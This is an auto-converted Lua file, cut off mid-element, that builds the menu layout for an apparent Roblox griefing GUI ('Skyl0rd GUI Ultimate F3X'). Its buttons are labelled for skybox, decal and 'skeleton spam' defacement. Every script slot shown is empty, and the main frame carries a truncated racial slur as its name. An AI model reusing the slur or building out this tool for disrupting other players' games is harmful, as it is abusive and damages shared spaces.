--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 132 | Scripts: 64 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.nigg
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Active"] = true;
G2L["2"]["BorderSizePixel"] = 4;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Selectable"] = true;
G2L["2"]["Size"] = UDim2.new(0, 757, 0, 699);
G2L["2"]["Position"] = UDim2.new(0.25017, 0, 0.10145, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Name"] = [[nigg]];


-- StarterGui.ScreenGui.nigg.ScrollingFrame
G2L["3"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["3"]["Active"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["CanvasPosition"] = Vector2.new(0, 99);
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(27, 16, 2);
G2L["3"]["Size"] = UDim2.new(0, 755, 0, 699);
G2L["3"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Position"] = UDim2.new(0.00264, 0, -0, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["4"] = Instance.new("TextButton", G2L["3"]);
G2L["4"]["TextWrapped"] = true;
G2L["4"]["TextSize"] = 14;
G2L["4"]["TextScaled"] = true;
G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["4"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["Text"] = [[Skybox]];
G2L["4"]["Position"] = UDim2.new(0, 0, 0.06316, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["4"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["6"] = Instance.new("TextButton", G2L["3"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextScaled"] = true;
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["Size"] = UDim2.new(0, 110, 0, 50);
G2L["6"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Text"] = [[R6]];


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["8"] = Instance.new("TextButton", G2L["3"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["Size"] = UDim2.new(0, 110, 0, 50);
G2L["8"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["Text"] = [[RE]];
G2L["8"]["Position"] = UDim2.new(0.85602, 0, 0, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextLabel
G2L["a"] = Instance.new("TextLabel", G2L["3"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextScaled"] = true;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Size"] = UDim2.new(0, 458, 0, 36);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Skyl0rd GUI Ultimate F3X]];
G2L["a"]["Position"] = UDim2.new(0.18432, 0, -0.00245, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextLabel
G2L["b"] = Instance.new("TextLabel", G2L["3"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(0, 408, 0, 27);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Based off coikax and cZerGui]];
G2L["b"]["Position"] = UDim2.new(0.21859, 0, 0.03535, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["c"] = Instance.new("TextButton", G2L["3"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextScaled"] = true;
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["Text"] = [[Decal]];
G2L["c"]["Position"] = UDim2.new(0.21859, 0, 0.06316, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["e"] = Instance.new("TextButton", G2L["3"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Text"] = [[Trippy Skybox]];
G2L["e"]["Position"] = UDim2.new(0.43979, 0, 0.06316, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["10"] = Instance.new("TextButton", G2L["3"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextScaled"] = true;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["10"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["Text"] = [[Skeleton spam]];
G2L["10"]["Position"] = UDim2.new(0.67147, 0, 0.06316, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["12"] = Instance.new("TextButton", G2L["3"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["TextSize"] = 14;
G2L["12"]["TextScaled"] = true;
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["12"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Text"] = [[Skeleton skybox]];
G2L["12"]["Position"] = UDim2.new(-0.00123, 0, 0.1086, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["13"] = Instance.new("LocalScript", G2L["12"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["14"] = Instance.new("TextButton", G2L["3"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextScaled"] = true;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["14"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["Text"] = [[Chicken arms]];
G2L["14"]["Position"] = UDim2.new(0.67147, 0, 0.1086, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["15"] = Instance.new("LocalScript", G2L["14"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["16"] = Instance.new("TextButton", G2L["3"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextScaled"] = true;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["16"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["Text"] = [[Cat Trippy]];
G2L["16"]["Position"] = UDim2.new(0.67147, 0, 0.17761, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["17"] = Instance.new("LocalScript", G2L["16"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["18"] = Instance.new("TextButton", G2L["3"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextScaled"] = true;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["Size"] = UDim2.new(0, 153, 0, 34);
G2L["18"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["Text"] = [[Fencing Restore]];
G2L["18"]["Position"] = UDim2.new(0.67147, 0, 0.2228, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["19"] = Instance.new("LocalScript", G2L["18"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["1a"] = Instance.new("TextButton", G2L["3"]);
G2L["1a"]["TextWrapped"] = true;
G2L["1a"]["TextSize"] = 14;
G2L["1a"]["TextScaled"] = true;
G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["Size"] = UDim2.new(0, 153, 0, 34);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["Text"] = [[LNicky Ultimate v2]];
G2L["1a"]["Position"] = UDim2.new(0.67147, 0, 0.25362, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["1c"] = Instance.new("TextButton", G2L["3"]);
G2L["1c"]["TextWrapped"] = true;
G2L["1c"]["TextSize"] = 14;
G2L["1c"]["TextScaled"] = true;
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["Size"] = UDim2.new(0, 153, 0, 47);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["Text"] = [[Dih Sword]];
G2L["1c"]["Position"] = UDim2.new(0.66219, 0, 0.29451, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["1d"] = Instance.new("LocalScript", G2L["1c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["1e"] = Instance.new("TextButton", G2L["3"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["TextSize"] = 14;
G2L["1e"]["TextScaled"] = true;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["Size"] = UDim2.new(0, 146, 0, 50);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["Text"] = [[1x1 Returns Sky]];
G2L["1e"]["Position"] = UDim2.new(0.66219, 0, 0.34008, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["20"] = Instance.new("TextButton", G2L["3"]);
G2L["20"]["TextWrapped"] = true;
G2L["20"]["TextSize"] = 14;
G2L["20"]["TextScaled"] = true;
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["Size"] = UDim2.new(0, 152, 0, 43);
G2L["20"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["Text"] = [[Title]];
G2L["20"]["Position"] = UDim2.new(0.65292, 0, 0.42902, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["21"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["22"] = Instance.new("TextButton", G2L["3"]);
G2L["22"]["TextWrapped"] = true;
G2L["22"]["TextSize"] = 14;
G2L["22"]["TextScaled"] = true;
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["22"]["Size"] = UDim2.new(0, 153, 0, 48);
G2L["22"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["Text"] = [[Ellernate Particles]];
G2L["22"]["Position"] = UDim2.new(0.43979, 0, 0.38417, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["23"] = Instance.new("LocalScript", G2L["22"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["24"] = Instance.new("TextButton", G2L["3"]);
G2L["24"]["TextWrapped"] = true;
G2L["24"]["TextSize"] = 14;
G2L["24"]["TextScaled"] = true;
G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24"]["Size"] = UDim2.new(0, 153, 0, 44);
G2L["24"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["Text"] = [[Char all]];
G2L["24"]["Position"] = UDim2.new(0.43979, 0, 0.29544, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["25"] = Instance.new("LocalScript", G2L["24"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["26"] = Instance.new("TextButton", G2L["3"]);
G2L["26"]["TextWrapped"] = true;
G2L["26"]["TextSize"] = 14;
G2L["26"]["TextScaled"] = true;
G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["26"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["Text"] = [[Nex Pluvia]];
G2L["26"]["Position"] = UDim2.new(0.43979, 0, 0.34058, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["27"] = Instance.new("LocalScript", G2L["26"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["28"] = Instance.new("TextButton", G2L["3"]);
G2L["28"]["TextWrapped"] = true;
G2L["28"]["TextSize"] = 14;
G2L["28"]["TextScaled"] = true;
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["Size"] = UDim2.new(0, 153, 0, 34);
G2L["28"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["Text"] = [[cZerSky]];
G2L["28"]["Position"] = UDim2.new(0.44641, 0, 0.25362, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["29"] = Instance.new("LocalScript", G2L["28"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["2a"] = Instance.new("TextButton", G2L["3"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["TextSize"] = 14;
G2L["2a"]["TextScaled"] = true;
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["Size"] = UDim2.new(0, 153, 0, 34);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["Text"] = [[Coikax Trippy]];
G2L["2a"]["Position"] = UDim2.new(0.44906, 0, 0.2228, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["2c"] = Instance.new("TextButton", G2L["3"]);
G2L["2c"]["TextWrapped"] = true;
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["TextScaled"] = true;
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["Size"] = UDim2.new(0, 153, 0, 49);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["Text"] = [[Skyl0rd particles]];
G2L["2c"]["Position"] = UDim2.new(0, 0, 0.33966, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["2e"] = Instance.new("TextButton", G2L["3"]);
G2L["2e"]["TextWrapped"] = true;
G2L["2e"]["TextSize"] = 14;
G2L["2e"]["TextScaled"] = true;
G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["Text"] = [[iOrb]];
G2L["2e"]["Position"] = UDim2.new(0.43979, 0, 0.1086, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["30"] = Instance.new("TextButton", G2L["3"]);
G2L["30"]["TextWrapped"] = true;
G2L["30"]["TextSize"] = 14;
G2L["30"]["TextScaled"] = true;
G2L["30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["30"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["Text"] = [[Skyl0rd funni nezi sky]];
G2L["30"]["Position"] = UDim2.new(0.21859, 0, 0.1086, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["31"] = Instance.new("LocalScript", G2L["30"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["32"] = Instance.new("TextButton", G2L["3"]);
G2L["32"]["TextWrapped"] = true;
G2L["32"]["TextSize"] = 14;
G2L["32"]["TextScaled"] = true;
G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["Size"] = UDim2.new(0, 332, 0, 50);
G2L["32"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["Text"] = [[AL_aaX Realm]];
G2L["32"]["Position"] = UDim2.new(-0.00918, 0, 0.16116, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["33"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["34"] = Instance.new("TextButton", G2L["3"]);
G2L["34"]["TextWrapped"] = true;
G2L["34"]["TextSize"] = 14;
G2L["34"]["TextScaled"] = true;
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["34"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["Text"] = [[LNicky Trippy]];
G2L["34"]["Position"] = UDim2.new(0.44906, 0, 0.17761, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["35"] = Instance.new("LocalScript", G2L["34"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["36"] = Instance.new("TextButton", G2L["3"]);
G2L["36"]["TextWrapped"] = true;
G2L["36"]["TextSize"] = 14;
G2L["36"]["TextScaled"] = true;
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["Size"] = UDim2.new(0, 153, 0, 40);
G2L["36"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["Text"] = [[Grab Knife F3X]];
G2L["36"]["Position"] = UDim2.new(0.22256, 0, 0.24933, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["37"] = Instance.new("LocalScript", G2L["36"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["38"] = Instance.new("TextButton", G2L["3"]);
G2L["38"]["TextWrapped"] = true;
G2L["38"]["TextSize"] = 14;
G2L["38"]["TextScaled"] = true;
G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["Size"] = UDim2.new(0, 153, 0, 42);
G2L["38"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["Text"] = [[c00lgui f3x]];
G2L["38"]["Position"] = UDim2.new(0.22124, 0, 0.29544, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["39"] = Instance.new("LocalScript", G2L["38"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["3a"] = Instance.new("TextButton", G2L["3"]);
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextScaled"] = true;
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["Text"] = [[Rotate parts]];
G2L["3a"]["Position"] = UDim2.new(0.22786, 0, 0.34021, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["3c"] = Instance.new("TextButton", G2L["3"]);
G2L["3c"]["TextWrapped"] = true;
G2L["3c"]["TextSize"] = 14;
G2L["3c"]["TextScaled"] = true;
G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c"]["Size"] = UDim2.new(0, 153, 0, 50);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["Text"] = [[AL_aaX Particles]];
G2L["3c"]["Position"] = UDim2.new(0.22124, 0, 0.38419, 0);


-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);



-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton
G2L["3e"] = Instance.new("TextButton", G2L["3"]);
G2L["3e"]["TextWrapped"] = true;
